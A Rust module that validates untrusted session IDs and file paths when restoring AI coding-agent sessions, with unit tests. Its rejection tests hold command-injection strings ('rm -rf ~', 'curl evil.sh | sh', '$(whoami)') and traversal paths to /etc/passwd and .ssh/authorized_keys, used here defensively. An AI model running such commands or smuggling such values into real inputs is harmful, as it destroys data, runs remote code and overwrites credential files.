//! The reconstitution registry and its safety checks (APS-V1-0004 section 6.4).
//!
//! A Reconstitutor restores a stored session onto a machine so the originating
//! harness can resume it natively. This module ships the per-`source_format`
//! knowledge that requires (section 6.4.2) plus the validation every
//! Reconstitutor must perform on untrusted envelope input (section 6.4.5).
//!
//! The registry is INFORMATIVE and separately versioned. Harnesses change their
//! on-disk layout on their own schedule; a stale entry is a registry correction,
//! never a change to the envelope contract (section 8.2).
//!
//! # Why the validation lives here
//!
//! `session_id` and `metadata.source_path` both come from producers, and push
//! producers are untrusted (section 10.3). A Reconstitutor interpolates the
//! first into a resume command and uses the second to choose a filesystem write
//! location. Getting either check wrong is a remote code execution or an
//! arbitrary file write. Shipping the checks in the standard's own crate means
//! every consumer inherits one implementation instead of writing its own.
//!
//! # What this module does and does not guarantee
//!
//! Be precise about the boundary, because "the crate handles it" is exactly the
//! assumption that produces vulnerabilities:
//!
//! - [`Entry::validate_session_id`] matches the registry's pattern and
//!   additionally enforces an ASCII identifier charset. Combined with a resume
//!   descriptor invoked WITHOUT a shell, this is sufficient against command
//!   injection. It is NOT sufficient if a caller joins the descriptor into a
//!   shell string; do not do that.
//! - [`is_safe_source_path`] is a LEXICAL check only. It cannot see symlinks.
//! - [`resolve_within_root`] adds filesystem resolution and is what a caller
//!   should actually use before writing. It still carries a time-of-check to
//!   time-of-use caveat, documented on that function.
//!
//! Nothing here sandboxes the resumed process. Once a harness resumes, it runs
//! with the invoking user's privileges.

use serde::Deserialize;
use std::collections::BTreeMap;

/// The shipped registry source, embedded verbatim.
pub const REGISTRY_TOML: &str = include_str!("../registry/reconstitution.toml");

/// The reconstitution registry: `source_format` to restore knowledge.
#[derive(Debug, Clone, Deserialize)]
pub struct Registry {
    /// Version of the registry itself, independent of `scs_version`.
    pub registry_version: String,
    /// Entries keyed by `source_format`.
    #[serde(flatten)]
    pub entries: BTreeMap<String, Entry>,
}

/// One harness's restore knowledge (section 6.4.2).
#[derive(Debug, Clone, Deserialize)]
pub struct Entry {
    /// The producing harness, matching the envelope's `agent` where applicable.
    pub harness: String,
    /// Human-readable note on the harness's on-disk layout.
    pub description: String,
    /// Where the harness expects the session file, as a template.
    pub path_template: String,
    /// How `raw` is written back to disk, for example `jsonl`.
    pub serialization: String,
    /// Anchored regex-style shape a `session_id` must match before use.
    pub session_id_pattern: String,
    /// Whether `metadata.source_path` should be preferred over the template.
    #[serde(default)]
    pub prefer_source_path: bool,
    /// How the harness derives a directory slug from a working directory.
    pub slug_rule: SlugRule,
    /// The structured resume descriptor. Never a shell string.
    pub resume: Resume,
}

/// How a harness derives its session directory slug from a working directory.
#[derive(Debug, Clone, Deserialize)]
pub struct SlugRule {
    /// `cwd_absolute` to derive from the absolute cwd, `none` if the harness
    /// does not partition by working directory.
    pub source: String,
    /// Ordered literal replacements applied to the path, as `[from, to]` pairs.
    #[serde(default)]
    pub replace: Vec<(String, String)>,
}

/// A structured resume descriptor (section 6.4.5).
///
/// Deliberately a program plus an argument vector, never a single command
/// string: a Reconstitutor invokes it WITHOUT a shell, so interpolated values
/// cannot inject additional commands.
#[derive(Debug, Clone, Deserialize)]
pub struct Resume {
    /// The program to execute, for example `claude`.
    pub program: String,
    /// Argument templates, for example `["--resume", "{session_id}"]`.
    pub args: Vec<String>,
    /// Working directory template for the resumed process.
    pub cwd: String,
}

/// Errors from loading or using the registry.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum RegistryError {
    /// No entry exists for the given `source_format`.
    ///
    /// This is the correct outcome for a harness that cannot be reconstituted
    /// (Cursor, which keeps sessions in SQLite rather than per-session files).
    /// A Reconstitutor MUST fail loudly here rather than guess a path
    /// (section 6.4.3).
    UnknownSourceFormat(String),
    /// The `session_id` did not match the entry's expected shape.
    InvalidSessionId,
    /// `metadata.source_path` was absolute or escaped the harness root.
    UnsafeSourcePath,
}

impl std::fmt::Display for RegistryError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            RegistryError::UnknownSourceFormat(sf) => write!(
                f,
                "no reconstitution registry entry for source_format `{sf}`; \
                 this harness cannot be reconstituted"
            ),
            RegistryError::InvalidSessionId => {
                write!(
                    f,
                    "session_id does not match the registry entry's expected shape"
                )
            }
            RegistryError::UnsafeSourcePath => write!(
                f,
                "metadata.source_path is absolute or escapes the harness session root"
            ),
        }
    }
}

impl std::error::Error for RegistryError {}

impl Registry {
    /// Load the registry shipped with this standard.
    ///
    /// # Panics
    ///
    /// Panics if the embedded registry is malformed, which would mean the
    /// shipped package is corrupt. A test in `tests/` covers this.
    pub fn shipped() -> Self {
        toml::from_str(REGISTRY_TOML).expect("embedded reconstitution registry must parse")
    }

    /// Look up the entry for a `source_format`.
    pub fn entry(&self, source_format: &str) -> Result<&Entry, RegistryError> {
        self.entries
            .get(source_format)
            .ok_or_else(|| RegistryError::UnknownSourceFormat(source_format.to_string()))
    }
}

impl SlugRule {
    /// Derive the harness's directory slug from an absolute working directory.
    ///
    /// Returns `None` when the harness does not partition by working directory.
    pub fn slug_for(&self, cwd: &str) -> Option<String> {
        if self.source != "cwd_absolute" {
            return None;
        }
        let mut slug = cwd.to_string();
        for (from, to) in &self.replace {
            slug = slug.replace(from.as_str(), to.as_str());
        }
        Some(slug)
    }
}

impl Entry {
    /// Validate an untrusted `session_id` against this entry's
    /// `session_id_pattern` (section 6.4.5).
    ///
    /// The pattern is compiled and matched for real. An earlier version chose
    /// between two hard-coded shapes by inspecting the pattern text, which meant
    /// a future registry entry with a different pattern would silently fall
    /// through to the wrong check.
    ///
    /// A pattern that fails to compile rejects everything. That is deliberate:
    /// the failure mode of a bad pattern must be a refused restore, never an
    /// accepted hostile identifier.
    pub fn validate_session_id(&self, session_id: &str) -> Result<(), RegistryError> {
        // Defence in depth. Even a permissive or malformed registry pattern
        // cannot admit a value carrying shell metacharacters, whitespace, or
        // path separators, because this value is interpolated into a resume
        // argument vector and a path template.
        if !is_safe_identifier(session_id) {
            return Err(RegistryError::InvalidSessionId);
        }
        let anchored = anchor(&self.session_id_pattern);
        let re = regex::Regex::new(&anchored).map_err(|_| RegistryError::InvalidSessionId)?;
        if re.is_match(session_id) {
            Ok(())
        } else {
            Err(RegistryError::InvalidSessionId)
        }
    }
}

/// Force a pattern to match the whole string.
///
/// An unanchored pattern would match a substring, so `abc; rm -rf ~` could
/// satisfy a pattern intended to describe only `abc`.
fn anchor(pattern: &str) -> String {
    let mut anchored = String::with_capacity(pattern.len() + 4);
    if !pattern.starts_with('^') {
        anchored.push_str("^(?:");
    }
    anchored.push_str(pattern);
    if !pattern.starts_with('^') {
        anchored.push(')');
    }
    if !pattern.ends_with('$') {
        anchored.push('$');
    }
    anchored
}

/// Whether a string is a conservative identifier: alphanumeric start, then
/// alphanumerics, hyphens, or underscores, bounded in length.
///
/// ASCII-only by design. A Unicode-permissive check would admit homoglyphs and
/// normalization surprises into a value that reaches a command line.
fn is_safe_identifier(s: &str) -> bool {
    !s.is_empty()
        && s.len() <= 128
        && s.chars().next().is_some_and(|c| c.is_ascii_alphanumeric())
        && s.chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
}

/// Windows reserved device names. Writing to any of these, with or without an
/// extension, targets a device rather than a file under the root.
const WINDOWS_RESERVED: [&str; 22] = [
    "CON", "PRN", "AUX", "NUL", "COM1", "COM2", "COM3", "COM4", "COM5", "COM6", "COM7", "COM8",
    "COM9", "LPT1", "LPT2", "LPT3", "LPT4", "LPT5", "LPT6", "LPT7", "LPT8", "LPT9",
];

fn is_windows_reserved(segment: &str) -> bool {
    let stem = segment.split('.').next().unwrap_or(segment);
    WINDOWS_RESERVED
        .iter()
        .any(|reserved| stem.eq_ignore_ascii_case(reserved))
}

/// Whether an untrusted `metadata.source_path` passes the LEXICAL half of the
/// containment check (section 6.4.5).
///
/// Rejects empty strings, embedded NUL, absolute POSIX paths, UNC and Windows
/// drive-qualified paths, Windows reserved device names, and any path that
/// escapes the root once `.` and `..` segments are resolved.
///
/// # This check alone is NOT sufficient
///
/// It is purely lexical. It cannot see symlinks: `link/authorized_keys` passes
/// here, and if `link` is a symlink or directory junction pointing outside the
/// root, writing the result escapes the root. A caller MUST additionally resolve
/// the path against the real filesystem and confirm containment. Use
/// [`resolve_within_root`], which does both.
///
/// Validation must also be the LAST string transformation before use. Percent
/// decoding or Unicode normalization applied after this check can reintroduce
/// separators it rejected.
pub fn is_safe_source_path(source_path: &str) -> bool {
    if source_path.is_empty() || source_path.contains('\0') {
        return false;
    }
    // Absolute (POSIX), UNC, or Windows drive-qualified paths are never relative
    // to the harness root.
    if source_path.starts_with('/') || source_path.starts_with('\\') {
        return false;
    }
    let bytes = source_path.as_bytes();
    if bytes.len() >= 2 && bytes[1] == b':' && bytes[0].is_ascii_alphabetic() {
        return false;
    }
    // Walk segments, treating both separators as separators so a Windows-style
    // traversal cannot slip past a POSIX-only split.
    let mut depth: i32 = 0;
    for segment in source_path.split(['/', '\\']) {
        match segment {
            "" | "." => continue,
            ".." => {
                depth -= 1;
                if depth < 0 {
                    return false;
                }
            }
            other => {
                if is_windows_reserved(other) {
                    return false;
                }
                depth += 1;
            }
        }
    }
    depth > 0
}

/// Resolve an untrusted `source_path` to an absolute path proven to sit inside
/// `root`, doing both halves of the containment check (section 6.4.5).
///
/// Performs the lexical check ([`is_safe_source_path`]), then resolves the
/// deepest existing ancestor of the target through the real filesystem
/// (following symlinks) and confirms the result is still under the canonicalized
/// root. This is what catches a `source_path` whose intermediate component is a
/// symlink out of the root, which the lexical check cannot see.
///
/// `root` must exist. The target itself need not: reconstitution creates it.
///
/// # Time-of-check to time-of-use
///
/// The returned path was contained *at the moment it was checked*. An attacker
/// who can create symlinks inside the root can swap a component between this
/// call and the subsequent write. On a single-user machine writing into the
/// user's own harness directory that is not a meaningful threat. Where it is,
/// a caller must additionally open with no-follow semantics relative to a
/// directory descriptor, which this crate does not attempt portably.
pub fn resolve_within_root(
    root: &std::path::Path,
    source_path: &str,
) -> Result<std::path::PathBuf, RegistryError> {
    if !is_safe_source_path(source_path) {
        return Err(RegistryError::UnsafeSourcePath);
    }
    let canonical_root = root
        .canonicalize()
        .map_err(|_| RegistryError::UnsafeSourcePath)?;

    // Normalize separators so a Windows-style path resolves on any host.
    let mut candidate = canonical_root.clone();
    for segment in source_path.split(['/', '\\']) {
        match segment {
            "" | "." => continue,
            ".." => {
                if !candidate.pop() || !candidate.starts_with(&canonical_root) {
                    return Err(RegistryError::UnsafeSourcePath);
                }
            }
            other => candidate.push(other),
        }
    }

    // Resolve the deepest ancestor that exists, so symlinked intermediate
    // components are followed and checked. The leaf itself may not exist yet.
    let mut existing = candidate.as_path();
    let mut trailing = Vec::new();
    while !existing.exists() {
        let Some(name) = existing.file_name() else {
            return Err(RegistryError::UnsafeSourcePath);
        };
        trailing.push(name.to_owned());
        let Some(parent) = existing.parent() else {
            return Err(RegistryError::UnsafeSourcePath);
        };
        existing = parent;
    }
    let mut resolved = existing
        .canonicalize()
        .map_err(|_| RegistryError::UnsafeSourcePath)?;
    if !resolved.starts_with(&canonical_root) {
        return Err(RegistryError::UnsafeSourcePath);
    }
    for name in trailing.into_iter().rev() {
        resolved.push(name);
    }
    if !resolved.starts_with(&canonical_root) {
        return Err(RegistryError::UnsafeSourcePath);
    }
    Ok(resolved)
}

/// Validate an untrusted `source_path`, returning it when safe.
pub fn checked_source_path(source_path: &str) -> Result<&str, RegistryError> {
    if is_safe_source_path(source_path) {
        Ok(source_path)
    } else {
        Err(RegistryError::UnsafeSourcePath)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn shipped_registry_parses_and_declares_a_version() {
        let reg = Registry::shipped();
        assert!(!reg.registry_version.is_empty());
        assert!(reg.entries.contains_key("claude-jsonl-v1"));
        assert!(reg.entries.contains_key("codex-turns-v1"));
    }

    #[test]
    fn unknown_source_format_is_an_error_not_a_guess() {
        let reg = Registry::shipped();
        // Cursor is captured but deliberately not reconstitutable (SQLite, not
        // per-session files). The registry says so by omission.
        let err = reg.entry("cursor-bubbles-v1").unwrap_err();
        assert_eq!(
            err,
            RegistryError::UnknownSourceFormat("cursor-bubbles-v1".to_string())
        );
    }

    #[test]
    fn claude_slug_rule_matches_observed_layout() {
        let reg = Registry::shipped();
        let entry = reg.entry("claude-jsonl-v1").unwrap();
        // Verified against a live ~/.claude/projects tree: separators and dots
        // both collapse to hyphens, so a dotted directory such as `.claude`
        // renders as `--claude`.
        assert_eq!(
            entry.slug_rule.slug_for("/Users/me/Code/proj").as_deref(),
            Some("-Users-me-Code-proj")
        );
        assert_eq!(
            entry
                .slug_rule
                .slug_for("/Users/me/Code/proj/.claude/worktrees/x")
                .as_deref(),
            Some("-Users-me-Code-proj--claude-worktrees-x")
        );
    }

    #[test]
    fn codex_has_no_cwd_slug() {
        let reg = Registry::shipped();
        let entry = reg.entry("codex-turns-v1").unwrap();
        assert_eq!(entry.slug_rule.slug_for("/Users/me/Code/proj"), None);
    }

    #[test]
    fn resume_is_structured_never_a_shell_string() {
        let reg = Registry::shipped();
        for (source_format, entry) in &reg.entries {
            assert!(
                !entry.resume.program.contains(' '),
                "{source_format}: resume.program must be a bare program, not a command line"
            );
            assert!(
                !entry.resume.program.is_empty(),
                "{source_format}: resume.program must be set"
            );
        }
    }

    #[test]
    fn codex_session_ids_must_be_uuids() {
        let reg = Registry::shipped();
        let entry = reg.entry("codex-turns-v1").unwrap();
        assert!(
            entry
                .validate_session_id("019e9515-c90c-74b1-9dd9-d5961364264a")
                .is_ok()
        );
        assert_eq!(
            entry.validate_session_id("not-a-uuid").unwrap_err(),
            RegistryError::InvalidSessionId
        );
    }

    #[test]
    fn session_id_injection_attempts_are_rejected() {
        let reg = Registry::shipped();
        let entry = reg.entry("claude-jsonl-v1").unwrap();
        assert!(
            entry
                .validate_session_id("0915b842-975d-4fce-bdb5-35ed5200e805")
                .is_ok()
        );
        for hostile in [
            "abc; rm -rf ~",
            "abc && curl evil.sh | sh",
            "../../etc/passwd",
            "$(whoami)",
            "`id`",
            "a b",
            "",
        ] {
            assert_eq!(
                entry.validate_session_id(hostile).unwrap_err(),
                RegistryError::InvalidSessionId,
                "must reject hostile session_id: {hostile:?}"
            );
        }
    }

    #[test]
    fn safe_source_paths_are_accepted() {
        for ok in [
            "2026/06/04/rollout-2026-06-04T17-01-33-abc.jsonl",
            "-Users-me-Code-proj/0915b842.jsonl",
            "./nested/file.jsonl",
        ] {
            assert!(is_safe_source_path(ok), "should accept: {ok}");
        }
    }

    #[test]
    fn traversal_and_absolute_source_paths_are_rejected() {
        for bad in [
            "../../../.ssh/authorized_keys",
            "/etc/passwd",
            "\\\\server\\share\\x",
            "C:\\Windows\\system32\\x",
            "a/../../..",
            "..",
            "",
            "with\0nul",
            ".",
        ] {
            assert!(!is_safe_source_path(bad), "should reject: {bad:?}");
        }
    }

    #[test]
    fn traversal_that_stays_inside_the_root_is_allowed() {
        // Descending then ascending nets out inside the root, which is fine.
        assert!(is_safe_source_path("a/b/../c.jsonl"));
        // Ascending past the root is not, even when a later segment descends.
        assert!(!is_safe_source_path("a/../../b.jsonl"));
    }

    #[test]
    fn windows_reserved_device_names_are_rejected() {
        // Writing to these targets a device, not a child of the root.
        for reserved in [
            "NUL",
            "nul",
            "CON.txt",
            "aux",
            "COM1",
            "lpt9.jsonl",
            "a/NUL",
        ] {
            assert!(
                !is_safe_source_path(reserved),
                "should reject Windows reserved name: {reserved}"
            );
        }
        // Names that merely start with a reserved prefix are fine.
        for ok in ["NULL.jsonl", "console/x.jsonl", "comic.jsonl"] {
            assert!(is_safe_source_path(ok), "should accept: {ok}");
        }
    }

    #[test]
    fn session_id_is_matched_against_the_registry_pattern_not_a_guess() {
        // A pattern the old heuristic would have mis-handled: it contains no
        // "{12}", so the previous implementation fell through to the identifier
        // whitelist and accepted "abc".
        let entry = Entry {
            harness: "Test".into(),
            description: "digits only".into(),
            path_template: "{session_id}".into(),
            serialization: "jsonl".into(),
            session_id_pattern: "^[0-9]+$".into(),
            prefer_source_path: false,
            slug_rule: SlugRule {
                source: "none".into(),
                replace: Vec::new(),
            },
            resume: Resume {
                program: "true".into(),
                args: Vec::new(),
                cwd: ".".into(),
            },
        };
        assert!(entry.validate_session_id("12345").is_ok());
        assert_eq!(
            entry.validate_session_id("abc").unwrap_err(),
            RegistryError::InvalidSessionId,
            "a non-matching id must be rejected by the pattern, not waved through"
        );
    }

    #[test]
    fn an_unanchored_pattern_still_matches_the_whole_id() {
        let entry = Entry {
            harness: "Test".into(),
            description: "unanchored".into(),
            path_template: "{session_id}".into(),
            serialization: "jsonl".into(),
            // Deliberately unanchored: must not match a prefix of a longer id.
            session_id_pattern: "[0-9]+".into(),
            prefer_source_path: false,
            slug_rule: SlugRule {
                source: "none".into(),
                replace: Vec::new(),
            },
            resume: Resume {
                program: "true".into(),
                args: Vec::new(),
                cwd: ".".into(),
            },
        };
        assert!(entry.validate_session_id("123").is_ok());
        assert_eq!(
            entry.validate_session_id("123abc").unwrap_err(),
            RegistryError::InvalidSessionId
        );
    }

    #[test]
    fn an_uncompilable_pattern_rejects_everything() {
        let entry = Entry {
            harness: "Test".into(),
            description: "broken".into(),
            path_template: "{session_id}".into(),
            serialization: "jsonl".into(),
            session_id_pattern: "^[unclosed".into(),
            prefer_source_path: false,
            slug_rule: SlugRule {
                source: "none".into(),
                replace: Vec::new(),
            },
            resume: Resume {
                program: "true".into(),
                args: Vec::new(),
                cwd: ".".into(),
            },
        };
        // Fail closed: a broken registry entry must refuse restores, never
        // accept an unvalidated identifier.
        assert_eq!(
            entry.validate_session_id("anything").unwrap_err(),
            RegistryError::InvalidSessionId
        );
    }

    #[test]
    fn resolve_within_root_catches_a_symlink_escape_the_lexical_check_cannot() {
        let base = std::env::temp_dir().join("apss-scs-symlink-test");
        let _ = std::fs::remove_dir_all(&base);
        let root = base.join("root");
        let outside = base.join("outside");
        std::fs::create_dir_all(&root).unwrap();
        std::fs::create_dir_all(&outside).unwrap();

        #[cfg(unix)]
        std::os::unix::fs::symlink(&outside, root.join("link")).unwrap();
        #[cfg(not(unix))]
        {
            let _ = &outside;
            return;
        }

        // The lexical check cannot see through the symlink and accepts it.
        assert!(is_safe_source_path("link/authorized_keys"));
        // The filesystem-aware check rejects it.
        assert_eq!(
            resolve_within_root(&root, "link/authorized_keys").unwrap_err(),
            RegistryError::UnsafeSourcePath,
            "a symlinked component escaping the root must be rejected"
        );
        // A genuine in-root path still resolves.
        let ok = resolve_within_root(&root, "projects/session.jsonl").unwrap();
        assert!(ok.starts_with(root.canonicalize().unwrap()));

        let _ = std::fs::remove_dir_all(&base);
    }

    #[test]
    fn checked_source_path_surfaces_the_error() {
        assert_eq!(
            checked_source_path("../../etc/passwd").unwrap_err(),
            RegistryError::UnsafeSourcePath
        );
        assert_eq!(checked_source_path("a/b.jsonl").unwrap(), "a/b.jsonl");
    }
}
